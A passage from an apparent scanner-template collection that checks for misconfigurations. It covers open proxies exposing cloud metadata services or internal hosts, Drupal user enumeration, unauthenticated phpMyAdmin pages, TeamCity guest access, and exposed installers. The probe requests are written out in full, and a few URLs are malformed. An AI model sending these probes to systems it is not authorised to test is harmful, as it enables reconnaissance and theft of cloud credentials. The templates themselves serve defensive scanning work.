- tags - exposure,config,azure,microsoft,proxy,misconfig,metadata
## Requests
### Step - 1
```
GET http://{{hostval}}/metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: {{hostval}}
Metadata: true

```
### Matchers

**Type - word**
- part - body
- words
    1. osType
    2. ipAddress
- condition - and

**Payloads**- hostval

---
# Hetzner Cloud Metadata Service Check
## Description
- The Hetzner Cloud host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
- severity - critical
- tags - exposure,config,hetzner,proxy,misconfig,metadata
## Requests
### Step - 1
```
GET http://{{hostval}}/v1/metadata/private-networks HTTP/1.1
Host: {{hostval}}

```
### Matchers

**Type - word**
- part - body
- words
    1. alias_ips:
    2. local-ipv4:
    3. instance-id:
- condition - or

**Payloads**- hostval

---
# Openstack Metadata Service Check
## Description
- The Openstack host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
- severity - critical
- tags - exposure,config,openstack,proxy,misconfig,metadata
## Requests
### Step - 1
```
GET http://{{hostval}}/openstack/latest HTTP/1.1
Host: {{hostval}}

```
### Matchers

**Type - word**
- part - body
- words
    1. vendor_data.json

**Payloads**- hostval

---
# DigitalOcean Metadata Service Check
## Description
- The DigitalOcean host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
- severity - critical
- tags - exposure,config,digitalocean,proxy,misconfig,metadata
## Requests
### Step - 1
```
GET http://{{hostval}}/metadata/v1.json HTTP/1.1
Host: {{hostval}}

```
### Matchers

**Type - word**
- part - body
- words
    1. droplet_id

**Payloads**- hostval

---
# Amazon AWS Metadata Service Check
## Description
- The AWS host is configured as a proxy which allows access to the metadata service. This could allow significant access to the host/infrastructure.
- severity - critical
- tags - exposure,proxy,aws,amazon,misconfig,metadata
## Requests
### Step - 1
```
GET http://{{hostval}}/latest/meta-data/ HTTP/1.1
Host: {{hostval}}

```
### Matchers

**Type - word**
- part - body
- words
    1. public-ipv4
    2. privateIp
- condition - or

**Payloads**- hostval

---
# Open Proxy to Other Web Ports via Proxy's localhost Interface
## Description
- The host is configured as a proxy which allows access to web ports on the host's internal interface.
- severity - high
- tags - exposure,config,proxy,misconfig,fuzz
## Requests
### Step - 1
```
GET / HTTP/1.1
Host: {{Hostname}}


```
### Step - 2
```
GET http://somethingthatdoesnotexist/ HTTP/1.1
Host: somethingthatdoesnotexist


```
### Step - 3
```
GET http://127.0.0.1/ HTTP/1.1
Host: 127.0.0.1


```
### Step - 4
```
GET https://127.0.0.1/ HTTP/1.1
Host: 127.0.0.1


```
### Step - 5
```
GET http://localhost/ HTTP/1.1
Host: localhost


```
### Step - 6
```
GET https://localhost/ HTTP/1.1
Host: localhost


```
### Matchers

**Type - dsl**
- condition - or
- dsl
    1. (!contains(body_1, "\<title>IIS7\</title>") && !contains(body_2, "\<title>IIS7\</title>")) && (contains(body_3, "\<title>IIS7\</title>") || contains(body_4, "\<title>IIS7\</title>") || contains(body_5, "\<title>IIS7\</title>") || contains(body_6, "\<title>IIS7\</title>"))
    2. (!contains(body_1, "503 Service Unavailable") && !contains(body_2, "503 Service Unavailable")) && (contains(body_3, "503 Service Unavailable") || contains(body_4, "503 Service Unavailable") || contains(body_5, "503 Service Unavailable") || contains(body_6, "503 Service Unavailable"))
    3. (!contains(body_1, "default welcome page") && !contains(body_2, "default welcome page")) && (contains(body_3, "default welcome page") || contains(body_4, "default welcome page") || contains(body_5, "default welcome page") || contains(body_6, "default welcome page"))
    4. (!contains(body_1, "IIS Windows Server") && !contains(body_2, "IIS Windows Server")) && (contains(body_3, "IIS Windows Server") || contains(body_4, "IIS Windows Server") || contains(body_5, "IIS Windows Server") || contains(body_6, "IIS Windows Server"))
    5. (!contains(body_1, "Microsoft Azure App") && !contains(body_2, "Microsoft Azure App")) && (contains(body_3, "Microsoft Azure App") || contains(body_4, "Microsoft Azure App") || contains(body_5, "Microsoft Azure App") || contains(body_6, "Microsoft Azure App"))
    6. (!contains(body_1, "Welcome to IIS") && !contains(body_2, "Welcome to IIS")) && (contains(body_3, "Welcome to IIS") || contains(body_4, "Welcome to IIS") || contains(body_5, "Welcome to IIS") || contains(body_6, "Welcome to IIS"))
    7. (!contains(body_1, "Welcome to Microsoft Windows") && !contains(body_2, "Welcome to Microsoft Windows")) && (contains(body_3, "Welcome to Microsoft Windows") || contains(body_4, "Welcome to Microsoft Windows") || contains(body_5, "Welcome to Microsoft Windows") || contains(body_6, "Welcome to Microsoft Windows"))
    8. (!contains(body_1, "Welcome to Windows") && !contains(body_2, "Welcome to Windows")) && (contains(body_3, "Welcome to Windows") || contains(body_4, "Welcome to Windows") || contains(body_5, "Welcome to Windows") || contains(body_6, "Welcome to Windows"))
    9. (!contains(body_1, "Welcome to Windows") && !contains(body_2, "Welcome to Windows")) && (contains(body_3, "Welcome to Windows") || contains(body_4, "Welcome to Windows") || contains(body_5, "Welcome to Windows") || contains(body_6, "Welcome to Windows"))
    10. (!contains(body_1, "It works") && !contains(body_2, "It works")) && (contains(body_3, "It works") || contains(body_4, "It works") || contains(body_5, "It works") || contains(body_6, "It works"))

---
# Google GCP Metadata Service Check
## Description
- The Google cloud (GCP) host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
- severity - critical
- tags - exposure,config,google,gcp,proxy,misconfig,metadata
## Requests
### Step - 1
```
GET http://{{hostval}}/computeMetadata/v1/project/ HTTP/1.1
Host: {{hostval}}
Metadata-Flavor: Google

```
### Matchers

**Type - word**
- part - body
- words
    1. attributes/

**Payloads**- hostval

---
# Oracle Cloud Metadata Service Check
## Description
- The Oracle cloud host is configured as a proxy which allows access to the instance metadata IMDSv1 service. This could allow significant access to the host/infrastructure.
- severity - critical
- tags - exposure,config,oracle,proxy,misconfig,metadata
## Requests
### Step - 1
```
GET http://{{hostval}}/opc/v1/instance HTTP/1.1
Host: {{hostval}}
Metadata: true

```
### Matchers

**Type - word**
- part - body
- words
    1. availabilityDomain

**Payloads**- hostval

---
# Open Proxy To Internal Network
## Description
- The host is configured as a proxy which allows access to other hosts on the internal network.
- severity - high
- tags - exposure,config,proxy,misconfig,fuzz
## Requests
### Step - 1
```
GET / HTTP/1.1
Host: {{Hostname}}

```
### Step - 2
```
GET http://192.168.0.1/ HTTP/1.1
Host: 192.168.0.1

```
### Step - 3
```
GET https://192.168.0.1/ HTTP/1.1
Host: 192.168.0.1

```
### Step - 4
```
GET http://192.168.0.1:22/ HTTP/1.1
Host: 192.168.0.1

```
### Step - 5
```
GET http://192.168.1.1/ HTTP/1.1
Host: 192.168.1.1

```
### Step - 6
```
GET https://192.168.1.1/ HTTP/1.1
Host: 192.168.1.1

```
### Step - 7
```
GET http://192.168.1.1:22/ HTTP/1.1
Host: 192.168.1.1

```
### Step - 8
```
GET http://192.168.2.1/ HTTP/1.1
Host: 192.168.2.1

```
### Step - 9
```
GET https://192.168.2.1/ HTTP/1.1
Host: 192.168.2.1

```
### Step - 10
```
GET http://192.168.2.1:22/ HTTP/1.1
Host: 192.168.2.1

```
### Step - 11
```
GET http:/10.0.0.1/ HTTP/1.1
Host: 10.0.0.1

```
### Step - 12
```
GET https://10.0.0.1/ HTTP/1.1
Host: 10.0.0.1

```
### Step - 13
```
GET http://10.0.0.1:22/ HTTP/1.1
Host: 10.0.0.1

```
### Step - 14
```
GET http:/172.16.0.1/ HTTP/1.1
Host: 172.16.0.1

```
### Step - 15
```
GET https://172.16.0.1/ HTTP/1.1
Host: 172.16.0.1

```
### Step - 16
```
GET http://172.16.0.1:22/ HTTP/1.1
Host: 172.16.0.1

```
### Step - 17
```
GET http:/intranet/ HTTP/1.1
Host: intranet

```
### Step - 18
```
GET https://intranet/ HTTP/1.1
Host: intranet

```
### Step - 19
```
GET http://intranet:22/ HTTP/1.1
Host: intranet

```
### Step - 20
```
GET http:/mail/ HTTP/1.1
Host: mail

```
### Step - 21
```
GET https://mail/ HTTP/1.1
Host: mail

```
### Step - 22
```
GET http://mail:22/ HTTP/1.1
Host: mail

```
### Step - 23
```
GET http:/ntp/ HTTP/1.1
Host: ntp

```
### Step - 24
```
GET https://ntp/ HTTP/1.1
Host: ntp

```
### Step - 25
```
GET http://ntp:22/ HTTP/1.1
Host: ntp

```
### Matchers

**Type - dsl**
- dsl
    1. (!contains(body_1, "It works")) && (contains(body_2, "It works") || contains(body_3, "It works")) || contains(body_4, "It works") || contains(body_5, "It works") || contains(body_6, "It works") || contains(body_7, "It works") || contains(body_8, "It works") || contains(body_9, "It works") || contains(body_10, "It works") || contains(body_11, "It works") || contains(body_12, "It works") || contains(body_13, "It works") || contains(body_14, "It works") || contains(body_15, "It works") || contains(body_16, "It works") || contains(body_17, "It works") || contains(body_18, "It works") || contains(body_19, "It works") || contains(body_20, "It works") || contains(body_21, "It works") || contains(body_22, "It works") || contains(body_23, "It works")
    2. (!contains(body_1, "IIS Windows Server")) && (contains(body_2, "IIS Windows Server") || contains(body_3, "IIS Windows Server")) || contains(body_4, "IIS Windows Server") || contains(body_5, "IIS Windows Server") || contains(body_6, "IIS Windows Server") || contains(body_7, "IIS Windows Server") || contains(body_8, "IIS Windows Server") || contains(body_9, "IIS Windows Server") || contains(body_10, "IIS Windows Server") || contains(body_11, "IIS Windows Server") || contains(body_12, "IIS Windows Server") || contains(body_13, "IIS Windows Server") || contains(body_14, "IIS Windows Server") || contains(body_15, "IIS Windows Server") || contains(body_16, "IIS Windows Server") || contains(body_17, "IIS Windows Server") || contains(body_18, "IIS Windows Server") || contains(body_19, "IIS Windows Server") || contains(body_20, "IIS Windows Server") || contains(body_21, "IIS Windows Server") || contains(body_22, "IIS Windows Server") || contains(body_23, "IIS Windows Server")
    3. (!contains(body_1, "\<title>IIS7\</title>")) && (contains(body_2, "\<title>IIS7\</title>") || contains(body_3, "\<title>IIS7\</title>")) || contains(body_4, "\<title>IIS7\</title>") || contains(body_5, "\<title>IIS7\</title>") || contains(body_6, "\<title>IIS7\</title>") || contains(body_7, "\<title>IIS7\</title>") || contains(body_8, "\<title>IIS7\</title>") || contains(body_9, "\<title>IIS7\</title>") || contains(body_10, "\<title>IIS7\</title>") || contains(body_11, "\<title>IIS7\</title>") || contains(body_12, "\<title>IIS7\</title>") || contains(body_13, "\<title>IIS7\</title>") || contains(body_14, "\<title>IIS7\</title>") || contains(body_15, "\<title>IIS7\</title>") || contains(body_16, "\<title>IIS7\</title>") || contains(body_17, "\<title>IIS7\</title>") || contains(body_18, "\<title>IIS7\</title>") || contains(body_19, "\<title>IIS7\</title>") || contains(body_20, "\<title>IIS7\</title>") || contains(body_21, "\<title>IIS7\</title>") || contains(body_22, "\<title>IIS7\</title>") || contains(body_23, "\<title>IIS7\</title>")
    4. (!contains(body_1, "Welcome to Windows")) && (contains(body_2, "Welcome to Windows") || contains(body_3, "Welcome to Windows")) || contains(body_4, "Welcome to Windows") || contains(body_5, "Welcome to Windows") || contains(body_6, "Welcome to Windows") || contains(body_7, "Welcome to Windows") || contains(body_8, "Welcome to Windows") || contains(body_9, "Welcome to Windows") || contains(body_10, "Welcome to Windows") || contains(body_11, "Welcome to Windows") || contains(body_12, "Welcome to Windows") || contains(body_13, "Welcome to Windows") || contains(body_14, "Welcome to Windows") || contains(body_15, "Welcome to Windows") || contains(body_16, "Welcome to Windows") || contains(body_17, "Welcome to Windows") || contains(body_18, "Welcome to Windows") || contains(body_19, "Welcome to Windows") || contains(body_20, "Welcome to Windows") || contains(body_21, "Welcome to Windows") || contains(body_22, "Welcome to Windows") || contains(body_23, "Welcome to Windows")
    5. (!contains(body_1, "Welcome to Microsoft Windows")) && (contains(body_2, "Welcome to Microsoft Windows") || contains(body_3, "Welcome to Microsoft Windows")) || contains(body_4, "Welcome to Microsoft Windows") || contains(body_5, "Welcome to Microsoft Windows") || contains(body_6, "Welcome to Microsoft Windows") || contains(body_7, "Welcome to Microsoft Windows") || contains(body_8, "Welcome to Microsoft Windows") || contains(body_9, "Welcome to Microsoft Windows") || contains(body_10, "Welcome to Microsoft Windows") || contains(body_11, "Welcome to Microsoft Windows") || contains(body_12, "Welcome to Microsoft Windows") || contains(body_13, "Welcome to Microsoft Windows") || contains(body_14, "Welcome to Microsoft Windows") || contains(body_15, "Welcome to Microsoft Windows") || contains(body_16, "Welcome to Microsoft Windows") || contains(body_17, "Welcome to Microsoft Windows") || contains(body_18, "Welcome to Microsoft Windows") || contains(body_19, "Welcome to Microsoft Windows") || contains(body_20, "Welcome to Microsoft Windows") || contains(body_21, "Welcome to Microsoft Windows") || contains(body_22, "Welcome to Microsoft Windows") || contains(body_23, "Welcome to Microsoft Windows")
    6. (!contains(body_1, "Welcome to IIS")) && (contains(body_2, "Welcome to IIS") || contains(body_3, "Welcome to IIS")) || contains(body_4, "Welcome to IIS") || contains(body_5, "Welcome to IIS") || contains(body_6, "Welcome to IIS") || contains(body_7, "Welcome to IIS") || contains(body_8, "Welcome to IIS") || contains(body_9, "Welcome to IIS") || contains(body_10, "Welcome to IIS") || contains(body_11, "Welcome to IIS") || contains(body_12, "Welcome to IIS") || contains(body_13, "Welcome to IIS") || contains(body_14, "Welcome to IIS") || contains(body_15, "Welcome to IIS") || contains(body_16, "Welcome to IIS") || contains(body_17, "Welcome to IIS") || contains(body_18, "Welcome to IIS") || contains(body_19, "Welcome to IIS") || contains(body_20, "Welcome to IIS") || contains(body_21, "Welcome to IIS") || contains(body_22, "Welcome to IIS") || contains(body_23, "Welcome to IIS")
    7. (!contains(body_1, "503 Service Unavailable")) && (contains(body_2, "503 Service Unavailable") || contains(body_3, "503 Service Unavailable")) || contains(body_4, "503 Service Unavailable") || contains(body_5, "503 Service Unavailable") || contains(body_6, "503 Service Unavailable") || contains(body_7, "503 Service Unavailable") || contains(body_8, "503 Service Unavailable") || contains(body_9, "503 Service Unavailable") || contains(body_10, "503 Service Unavailable") || contains(body_11, "503 Service Unavailable") || contains(body_12, "503 Service Unavailable") || contains(body_13, "503 Service Unavailable") || contains(body_14, "503 Service Unavailable") || contains(body_15, "503 Service Unavailable") || contains(body_16, "503 Service Unavailable") || contains(body_17, "503 Service Unavailable") || contains(body_18, "503 Service Unavailable") || contains(body_19, "503 Service Unavailable") || contains(body_20, "503 Service Unavailable") || contains(body_21, "503 Service Unavailable") || contains(body_22, "503 Service Unavailable") || contains(body_23, "503 Service Unavailable")
    8. (!contains(body_1, "default welcome page")) && (contains(body_2, "default welcome page") || contains(body_3, "default welcome page")) || contains(body_4, "default welcome page") || contains(body_5, "default welcome page") || contains(body_6, "default welcome page") || contains(body_7, "default welcome page") || contains(body_8, "default welcome page") || contains(body_9, "default welcome page") || contains(body_10, "default welcome page") || contains(body_11, "default welcome page") || contains(body_12, "default welcome page") || contains(body_13, "default welcome page") || contains(body_14, "default welcome page") || contains(body_15, "default welcome page") || contains(body_16, "default welcome page") || contains(body_17, "default welcome page") || contains(body_18, "default welcome page") || contains(body_19, "default welcome page") || contains(body_20, "default welcome page") || contains(body_21, "default welcome page") || contains(body_22, "default welcome page") || contains(body_23, "default welcome page")
    9. (!contains(body_1, "Microsoft Azure App")) && (contains(body_2, "Microsoft Azure App") || contains(body_3, "Microsoft Azure App")) || contains(body_4, "Microsoft Azure App") || contains(body_5, "Microsoft Azure App") || contains(body_6, "Microsoft Azure App") || contains(body_7, "Microsoft Azure App") || contains(body_8, "Microsoft Azure App") || contains(body_9, "Microsoft Azure App") || contains(body_10, "Microsoft Azure App") || contains(body_11, "Microsoft Azure App") || contains(body_12, "Microsoft Azure App") || contains(body_13, "Microsoft Azure App") || contains(body_14, "Microsoft Azure App") || contains(body_15, "Microsoft Azure App") || contains(body_16, "Microsoft Azure App") || contains(body_17, "Microsoft Azure App") || contains(body_18, "Microsoft Azure App") || contains(body_19, "Microsoft Azure App") || contains(body_20, "Microsoft Azure App") || contains(body_21, "Microsoft Azure App") || contains(body_22, "Microsoft Azure App") || contains(body_23, "Microsoft Azure App")
    10. (!contains(body_1, "ssh")) && (contains(body_2, "ssh") || contains(body_3, "ssh")) || contains(body_4, "ssh") || contains(body_5, "ssh") || contains(body_6, "ssh") || contains(body_7, "ssh") || contains(body_8, "ssh") || contains(body_9, "ssh") || contains(body_10, "ssh") || contains(body_11, "ssh") || contains(body_12, "ssh") || contains(body_13, "ssh") || contains(body_14, "ssh") || contains(body_15, "ssh") || contains(body_16, "ssh") || contains(body_17, "ssh") || contains(body_18, "ssh") || contains(body_19, "ssh") || contains(body_20, "ssh") || contains(body_21, "ssh") || contains(body_22, "ssh") || contains(body_23, "ssh") || contains(body_24, "ssh")
    11. (!contains(body_1, "SSH")) && (contains(body_2, "SSH") || contains(body_3, "SSH")) || contains(body_4, "SSH") || contains(body_5, "SSH") || contains(body_6, "SSH") || contains(body_7, "SSH") || contains(body_8, "SSH") || contains(body_9, "SSH") || contains(body_10, "SSH") || contains(body_11, "SSH") || contains(body_12, "SSH") || contains(body_13, "SSH") || contains(body_14, "SSH") || contains(body_15, "SSH") || contains(body_16, "SSH") || contains(body_17, "SSH") || contains(body_18, "SSH") || contains(body_19, "SSH") || contains(body_20, "SSH") || contains(body_21, "SSH") || contains(body_22, "SSH") || contains(body_23, "SSH")
- condition - or

---
# Alibaba Metadata Service Check
## Description
- The Alibaba host is configured as a proxy which allows access to the metadata service. This could allow significant access to the host/infrastructure.
- severity - critical
- tags - exposure,config,alibaba,proxy,misconfig,metadata
## Requests
### Step - 1
```
GET http://{{hostval}}/dynamic/instance-identity/document HTTP/1.1
Host: {{hostval}}


```
### Matchers

**Type - word**
- part - body
- words
    1. zone-id

**Payloads**- hostval

---
# Drupal User Enumeration [Redirect]
- severity - info
- tags - drupal,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/user/0
- {{BaseURL}}/user/1
- {{BaseURL}}/user/2
- {{BaseURL}}/user/3
### Matchers

**Type - regex**
- regex
    1. (?i)Location: https?:\/\/[\w\.\-]+[:\/\w-]*\/users\/\w+
- part - header

**Type - status**
- status
    1. 301
### Extractors

**Type - regex**
- part - header
- regex
    1. users\/\w+

---
# Publicly Accessible Phpmyadmin Setup
- severity - medium
- tags - phpmyadmin,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/phpmyadmin/scripts/setup.php
- {{BaseURL}}/_phpmyadmin/scripts/setup.php
- {{BaseURL}}/forum/phpmyadmin/scripts/setup.php
- {{BaseURL}}/php/phpmyadmin/scripts/setup.php
- {{BaseURL}}/typo3/phpmyadmin/scripts/setup.php
- {{BaseURL}}/web/phpmyadmin/scripts/setup.php
- {{BaseURL}}/xampp/phpmyadmin/scripts/setup.php
- {{BaseURL}}/sysadmin/phpMyAdmin/scripts/setup.php
- {{BaseURL}}/phpmyadmin/setup/index.php
- {{BaseURL}}/pma/setup/index.php
- {{BaseURL}}/phpmyadmin/setup/
- {{BaseURL}}/setup/index.php
### Matchers

**Type - word**
- part - body
- words
    1. You want to configure phpMyAdmin using web interface
    2. \<title>phpMyAdmin setup\</title>
- condition - or

**Type - status**
- status
    1. 200

---
# phpmyadmin Data Exposure
## Description
- An unauthenticated instance of phpmyadmin was discovered, which could be leveraged to access sensitive information.
- severity - medium
- tags - phpmyadmin,misconfig,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/phpmyadmin/index.php?db=information_schema
- {{BaseURL}}/phpMyAdmin/index.php?db=information_schema
### Matchers

**Type - word**
- words
    1. var db    = 'information_schema';
    2. var opendb_url = 'db_structure.php';
- condition - and

**Type - status**
- status
    1. 200

---
# PhpMyAdmin Server Import
## Description
- Finds Unauthenticated PhpMyAdmin Server Import Pages.
- severity - high
- tags - phpmyadmin,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/pma/server_import.php
- {{BaseURL}}/phpmyadmin/server_import.php
- {{BaseURL}}/phpMyAdmin 2/server_import.php
- {{BaseURL}}/db/server_import.php
- {{BaseURL}}/server_import.php
- {{BaseURL}}/PMA/server_import.php
- {{BaseURL}}/admin/server_import.php
- {{BaseURL}}/admin/pma/server_import.php
- {{BaseURL}}/phpMyAdmin/server_import.php
- {{BaseURL}}/admin/phpMyAdmin/server_import.php
### Matchers

**Type - word**
- condition - and
- words
    1. File to import
    2. Location of the text file

**Type - status**
- status
    1. 200

---
# JetBrains TeamCity - Guest User Access Enabled
## Description
- TeamCity provides the ability to turn on the guest login allowing anonymous access to the TeamCity UI.

- severity - high
- tags - misconfig,teamcity,jetbrains
## Requests
### Step - 1
```
GET /guestLogin.html?guest=1 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - header
- words
    1. Location: /overview.html
    2. TCSESSIONID=
- condition - and

**Type - status**
- status
    1. 302

---
# JetBrains TeamCity - Registration Enabled
## Description
- JetBrains TeamCity allows all visitors to register due to a misconfiguration.

- severity - high
- tags - misconfig,auth-bypass,teamcity,jetbrains
## Requests
### Step - 1
```
GET /registerUser.html?init=1 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- words
    1. \<title>Register a New User Account ? TeamCity\</title>

---
# SMS Gateway Installation
- severity - high
- tags - misconfig,sms,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/index.php
### Matchers

**Type - word**
- part - body
- words
    1. SMS Gateway | Installation

**Type - status**
- status
    1. 200

---
# Ampache Music Installer
- severity - high
- tags - misconfig,ampache,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install.php
### Matchers

**Type - word**
- part - body
- words
    1. Ampache :: For the Love of Music - Installation
    2. Choose Installation Language
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# FacturaScripts Installer Exposure
- severity - high
- tags - misconfig,facturascripts,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. FacturaScripts installer
    2. connect to the database
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Mautic Installer Exposure
- severity - high
- tags - misconfig,mautic,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/installer
### Matchers

**Type - word**
- part - body
- words
    1. Mautic Installation - Environment Check
    2. Ready to Install!
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Magento Installation Wizard
- severity - high
- tags - misconfig,magento,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php/install/
### Matchers

**Type - word**
- part - body
- words
    1. Magento Installation Wizard
    2. Welcome to Magento's Installation Wizard!
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Webuzo Installer
- severity - high
- tags - misconfig,webuzo,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install.php
### Matchers

**Type - word**
- part - body
- words
    1. Webuzo Installer
    2. Webuzo Initial Setup
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# TYPO3 Installer
- severity - medium
- tags - misconfig,typo3,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/typo3/install.php
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Installing TYPO3 CMS\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# OpenMage Installation Wizard
- severity - high
- tags - misconfig,openmage,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php/install/
### Matchers

**Type - word**
- part - body
- words
    1. OpenMage Installation Wizard

**Type - status**
- status
    1. 200

---
# OwnCloud Installer Exposure
- severity - high
- tags - misconfig,owncloud,exposure,install
## Requests
- Method - GET
### URL
- {{BaseURL}}
- {{BaseURL}}/owncloud/
### Matchers

**Type - word**
- part - body
- words
    1. \<legend>Create an \<strong>admin account\</strong>
    2. ownCloud
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Server Monitor Installer
- severity - high
- tags - misconfig,monitor,exposure,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/install.php
### Matchers

**Type - word**
- part - body
- words
    1. \<title>SERVER MONITOR - Install\</title>
    2. PHP Server Monitor - Install
    3. install.php?action=config
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# phpBB Installation File Exposure
- severity - high
- tags - misconfig,phpbb,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/app.php
### Matchers

**Type - word**
- part - body
- words
    1. Installation Panel
    2. Introduction
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Matomo Installer Exposure
- severity - high
- tags - misconfig,matomo,install
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Matomo
    2. Installation status
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Webasyst Installer Exposure
- severity - high
- tags - misconfig,webasyst,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Webasyst Installer

**Type - status**
- status
    1. 200

---
# Limesurvey Installer Exposure
- severity - high
- tags - misconfig,limesurvey,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?r=installer/welcome
### Matchers

**Type - word**
- part - body
- words
    1. LimeSurvey installer
    2. Progress
    3. Your preferred language will be used through out the installation process
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ProcessWire 3.x Installer Exposure
- severity - unknown
- tags - misconfig,processwire,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
- {{BaseURL}}/install.php
### Matchers

**Type - word**
- part - body
- words
    1. \<title>ProcessWire 3.x Installer

**Type - status**
- status
    1. 200

---
# Moodle Installation Exposure
- severity - high
- tags - misconfig,moodle,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install.php
### Matchers

**Type - word**
- part - body
- words
    1. Installation - Moodle

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# openSIS Installation Wizard
- severity - high
- tags - misconfig,opensis,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/index.php
### Matchers

**Type - word**
- part - body
- words
    1. openSIS Installer

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# NginX Auto Installer Exposure
- severity - low
- tags - misconfig,nginx,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. NginX Auto Installer

**Type - status**
- status
    1. 200

---
# NodeBB Web Installer
- severity - high
- tags - misconfig,nodebb,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. NodeBB Web Installer
    2. Create an Administrator account
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Tiny Tiny RSS Installer Exposure
- severity - high
- tags - misconfig,tiny,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/
### Matchers

**Type - word**
- part - body
- words
    1. Tiny Tiny RSS - Installer
    2. Test configuration
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Permissions  Installer Exposure
- severity - high
- tags - misconfig,permissions,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<title> Permissions | Installer

**Type - status**
- status
    1. 200

---
# Oxid EShop Installer Exposure
- severity - high
- tags - misconfig,oxid,eshop,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/Setup/index.php/
### Matchers

**Type - word**
- part - body
- words
    1. OXID eShop installation
    2. System Requirements
- condition - and

**Type - status**
- status
    1. 200

---
# DokuWiki Install Exposure
- severity - high
- tags - misconfig,dokuwiki,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install.php
### Matchers

**Type - word**
- part - body
- words
    1. DokuWiki Installer
    2. Superuser
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# nopCommerce Installer Exposure
- severity - high
- tags - misconfig,nopcommerce,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/install
### Matchers

**Type - word**
- part - body
- words
    1. nopCommerce installation
    2. Store information
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# TestRail Installation Wizard
- severity - high
- tags - misconfig,testrail,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?/installer
### Matchers

**Type - word**
- part - body
- words
    1. TestRail Installation Wizard

**Type - status**
- status
    1. 200

---
# CloudCenter Installer Exposure
- severity - unknown
- tags - misconfig,cisco,cloudcenter,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<title>CloudCenter Installer

**Type - status**
- status
    1. 200

---
# SumoWebTools Installer Exposure
- severity - high
- tags - misconfig,sumowebtools,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install
### Matchers

**Type - word**
- part - body
- words
    1. SumoWebTools Installer
    2. configure
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# LMSZAI Installer Exposure
- severity - high
- tags - misconfig,blesta,install,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/install
### Matchers

**Type - word**
- part - body
- words
    1. LMSZAI - Learning Management System
    2. Configuaration
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Turbo Website Reviewer Installer Panel
- severity - high
- tags - turbo,misconfig,exposure,install
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin/install/install.php
### Matchers

**Type - word**
- part - body
- words
    1. Turbo Website Reviewer | Installer panel
    2. >Admin!\</a> \</p>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# EShop Installer Exposure
- severity - high
